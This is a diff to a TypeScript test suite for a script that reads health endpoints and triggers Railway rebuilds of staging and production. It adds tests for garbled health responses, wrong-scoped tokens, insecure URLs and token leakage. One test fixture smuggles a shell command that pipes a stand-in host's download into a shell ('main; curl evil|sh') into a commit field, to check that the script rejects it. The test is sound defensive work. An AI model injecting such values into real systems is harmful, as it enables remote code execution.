@@ -28,6 +28,7 @@ import { ECB_DAILY_URL } from "../../scripts/fx-snapshot.ts";
 import {
   FX_REFRESH_AT_VARIABLE,
   RAILWAY_API_URL,
+  requestRebuild,
   runFxRefresh,
 } from "../../scripts/fx-refresh.ts";
 import { server } from "../msw/server.ts";
@@ -140,13 +141,14 @@ const PRODUCTION_TOKEN = "fixture-production-token";
 function healthBody(
   commit: string,
   fxAsOf: string | undefined,
+  appEnv: string = commit === PRODUCTION_SHA ? "production" : "staging",
 ): Record<string, unknown> {
   return {
     status: "ok",
     version: commit,
-    env: "staging",
+    env: appEnv,
     commit,
-    appEnv: "staging",
+    appEnv,
     region: "europe-west4-drams3a",
     ...(fxAsOf === undefined ? {} : { fxAsOf, fxSource: "ecb-build" }),
   };
@@ -160,6 +162,8 @@ interface RailwayCall {
 }
 
 let railwayCalls: RailwayCall[] = [];
+/** Which Railway environment each token reaches: the project token's scope. */
+let tokenEnvironment: Record<string, string> = {};
 let reported: string[] = [];
 
 /** Railway answers in the shape its public API documents, one project and environment per token. */
@@ -172,29 +176,35 @@ function railwayHandler() {
     };
     const operation = /projectToken/u.test(query)
       ? "projectToken"
-      : /services/u.test(query)
-        ? "services"
+      : /environment\(id/u.test(query)
+        ? "environment"
         : /variableUpsert/u.test(query)
           ? "variableUpsert"
           : /serviceInstanceDeployV2/u.test(query)
             ? "serviceInstanceDeployV2"
             : "unknown";
     railwayCalls.push({ token, operation, variables });
-    const environmentId =
-      token === STAGING_TOKEN ? "env-staging" : "env-production";
+    const environmentId = tokenEnvironment[token ?? ""] ?? "env-unknown";
     switch (operation) {
       case "projectToken":
         return HttpResponse.json({
           data: { projectToken: { projectId: "project-1", environmentId } },
         });
-      case "services":
+      case "environment":
+        // The shape `pnpm railway:check` reads live (`scripts/railway-check.ts`).
         return HttpResponse.json({
           data: {
-            project: {
-              services: {
+            environment: {
+              name: String(variables.id).replace(/^env-/u, ""),
+              serviceInstances: {
                 edges: [
-                  { node: { id: "service-worker", name: "worker" } },
-                  { node: { id: "service-web", name: "web" } },
+                  {
+                    node: {
+                      serviceId: "service-worker",
+                      serviceName: "worker",
+                    },
+                  },
+                  { node: { serviceId: "service-web", serviceName: "web" } },
                 ],
               },
             },
@@ -255,6 +265,10 @@ function deploys(): readonly (readonly [string | null, unknown])[] {
 }
 
 beforeEach(() => {
+  tokenEnvironment = {
+    [STAGING_TOKEN]: "env-staging",
+    [PRODUCTION_TOKEN]: "env-production",
+  };
   railwayCalls = [];
   reported = [];
   server.use(
@@ -294,7 +308,7 @@ describe("the decision script (AC-34, T-34)", () => {
     const operations = railwayCalls.map((call) => call.operation);
     expect(operations).toEqual([
       "projectToken",
-      "services",
+      "environment",
       "variableUpsert",
       "serviceInstanceDeployV2",
     ]);
@@ -391,6 +405,11 @@ describe("the decision script (AC-34, T-34)", () => {
       "FX_REFRESH_STAGING_URL",
       "repository variable FX_REFRESH_STAGING_URL is not set",
     ],
+    // `/break 177` hole 9: a missing production URL fails; it is never "skipped".
+    [
+      "FX_REFRESH_PRODUCTION_URL",
+      "repository variable FX_REFRESH_PRODUCTION_URL is not set",
+    ],
   ] as const)(
     "exits non-zero naming a missing %s",
     async (missing, message) => {
@@ -475,5 +494,191 @@ describe("the decision script (AC-34, T-34)", () => {
     expect(reported.join("\n")).toMatch(
       /- staging: FAILED, rebuild request refused: Railway API: Not Authorized/u,
     );
+  });
+});
+
+/* -------------------------------------------------------------------------- */
+/* Round 1 of `/review 177` and `/break 177`.                                 */
+/* -------------------------------------------------------------------------- */
+
+/** Every reported line, joined: what reaches the run log and the step summary. */
+const printed = (): string => reported.join("\n");
+const TOKENS = /fixture-(?:staging|production)-token/u;
+
+describe("a hostile or garbled /api/health chooses nothing (/review 177 change 2, /break hole 7)", () => {
+  const behind = (overrides: Record<string, unknown>) => ({
+    ...healthBody(STAGING_SHA, "2026-10-01"),
+    ...overrides,
+  });
+
+  it.each([
+    ["a branch name as commit", behind({ commit: "main" })],
+    [
+      "a commit with shell metacharacters",
+      behind({ commit: "main; curl evil|sh" }),
+    ],
+    ["a 39-character commit", behind({ commit: STAGING_SHA.slice(1) })],
+    [
+      "an uppercase commit",
+      behind({ commit: STAGING_SHA.toUpperCase().replace(/1/gu, "A") }),
+    ],
+    ["no commit", behind({ commit: undefined })],
+    ['fxAsOf "0"', behind({ fxAsOf: "0" })],
+    ["a timestamp as fxAsOf", behind({ fxAsOf: "2026-10-01T00:00:00Z" })],
+    ["an impossible fxAsOf date", behind({ fxAsOf: "2026-02-30" })],
+    ['status "error"', behind({ status: "error" })],
+  ])("skips staging on %s, with no Railway call", async (_name, body) => {
+    server.use(
+      health(STAGING_URL, body),
+      health(PRODUCTION_URL, healthBody(PRODUCTION_SHA, ECB_DATE)),
+    );
+    const outcome = await run();
+    expect(outcome.results[0]).toMatchObject({
+      env: "staging",
+      state: "skipped",
+    });
+    expect(railwayCalls).toEqual([]);
+    // Nothing from the body is echoed into the step summary.
+    expect(printed()).not.toMatch(/curl evil|main;/u);
+  });
+
+  it("skips staging when health answers 503 with a health-shaped JSON body", async () => {
+    server.use(
+      http.get(`${STAGING_URL}/api/health`, () =>
+        HttpResponse.json(healthBody(STAGING_SHA, "2026-10-01"), {
+          status: 503,
+        }),
+      ),
+      health(PRODUCTION_URL, healthBody(PRODUCTION_SHA, ECB_DATE)),
+    );
+    const outcome = await run();
+    expect(outcome.results[0]).toMatchObject({
+      env: "staging",
+      state: "skipped",
+      reason: "health answered HTTP 503",
+    });
+    expect(railwayCalls).toEqual([]);
+  });
+
+  it("refuses to send a non-SHA commit even when called directly", async () => {
+    await expect(
+      requestRebuild(
+        fetch,
+        STAGING_TOKEN,
+        "staging",
+        "main",
+        NOW.toISOString(),
+      ),
+    ).rejects.toThrow(/not a full SHA/u);
+    expect(railwayCalls).toEqual([]);
+  });
+});
+
+describe("a token or URL for the wrong environment deploys nothing (/break 177 hole 2)", () => {
+  it("refuses a production-scoped token in the staging slot, naming it, and exits non-zero", async () => {
+    tokenEnvironment[STAGING_TOKEN] = "env-production";
+    server.use(
+      health(STAGING_URL, healthBody(STAGING_SHA, "2026-10-01")),
+      health(PRODUCTION_URL, healthBody(PRODUCTION_SHA, ECB_DATE)),
+    );
+    const outcome = await run();
+    expect(outcome.exitCode).toBe(1);
+    expect(deploys()).toEqual([]);
+    expect(railwayCalls.map((call) => call.operation)).toEqual([
+      "projectToken",
+      "environment",
+    ]);
+    expect(printed()).toContain(
+      "the token reaches the Railway environment `production`, not `staging`",
+    );
+    expect(printed()).not.toMatch(TOKENS);
+  });
+
+  it("fails an environment whose URL answers as the other environment, with no Railway call", async () => {
+    server.use(
+      health(
+        STAGING_URL,
+        healthBody(PRODUCTION_SHA, "2026-10-01", "production"),
+      ),
+      health(PRODUCTION_URL, healthBody(PRODUCTION_SHA, ECB_DATE)),
+    );
+    const outcome = await run();
+    expect(outcome.exitCode).toBe(1);
+    expect(outcome.results[0]).toMatchObject({
+      env: "staging",
+      state: "failed",
+    });
+    expect(printed()).toContain(
+      "FX_REFRESH_STAGING_URL answers as `production`, not `staging`",
+    );
+    expect(railwayCalls).toEqual([]);
+  });
+
+  it("refuses a plain-http refresh URL, naming the variable", async () => {
+    server.use(health(PRODUCTION_URL, healthBody(PRODUCTION_SHA, ECB_DATE)));
+    const outcome = await run({
+      env: {
+        ...FULL_ENV,
+        FX_REFRESH_STAGING_URL: "http://staging.example.test",
+      },
+    });
+    expect(outcome.exitCode).toBe(1);
+    expect(printed()).toContain(
+      "repository variable FX_REFRESH_STAGING_URL must be an https:// URL",
+    );
+    expect(railwayCalls).toEqual([]);
+  });
+});
+
+describe("the normal 15:30 path: the ECB file is dated today (/break 177 hole 1)", () => {
+  it("rebuilds a lagging environment when the ECB date equals the run's date", async () => {
+    server.use(
+      health(STAGING_URL, healthBody(STAGING_SHA, "2026-10-01")),
+      health(PRODUCTION_URL, healthBody(PRODUCTION_SHA, ECB_DATE)),
+    );
+    const outcome = await runFxRefresh({
+      fetchImpl: fetch,
+      releaseTip: () => PRODUCTION_SHA,
+      // Friday 2026-10-02, 15:30 UTC: the captured daily file is today's.
+      now: new Date(`${ECB_DATE}T15:30:00Z`),
+      env: { ...FULL_ENV, FX_REFRESH_VERIFY: "false" },
+      report: (line) => reported.push(line),
+    });
+    expect(outcome).toMatchObject({ exitCode: 0, ecbDate: ECB_DATE });
+    expect(deploys()).toEqual([[STAGING_TOKEN, STAGING_SHA]]);
+  });
+});
+
+describe("no token is ever printed, on any path (/break 177 hole 8)", () => {
+  it("prints no token when a rebuild succeeds", async () => {
+    server.use(
+      health(STAGING_URL, healthBody(STAGING_SHA, "2026-10-01")),
+      health(PRODUCTION_URL, healthBody(PRODUCTION_SHA, "2026-10-01")),
+    );
+    await run();
+    expect(deploys()).toHaveLength(2);
+    expect(printed()).not.toMatch(TOKENS);
+  });
+
+  it("prints no token when Railway refuses, on either environment", async () => {
+    server.use(
+      health(STAGING_URL, healthBody(STAGING_SHA, "2026-10-01")),
+      health(PRODUCTION_URL, healthBody(PRODUCTION_SHA, "2026-10-01")),
+      http.post(RAILWAY_API_URL, () =>
+        HttpResponse.json(
+          { errors: [{ message: "Not Authorized" }] },
+          { status: 401 },
+        ),
+      ),
+    );
+    const outcome = await run();
+    expect(outcome.exitCode).toBe(1);
+    expect(printed()).toMatch(
+      /- staging: FAILED, rebuild request refused: Railway API: Not Authorized/u,
+    );
+    expect(printed()).toMatch(
+      /- production: FAILED, rebuild request refused: Railway API: Not Authorized/u,
+    );
+    expect(printed()).not.toMatch(TOKENS);
   });
 });
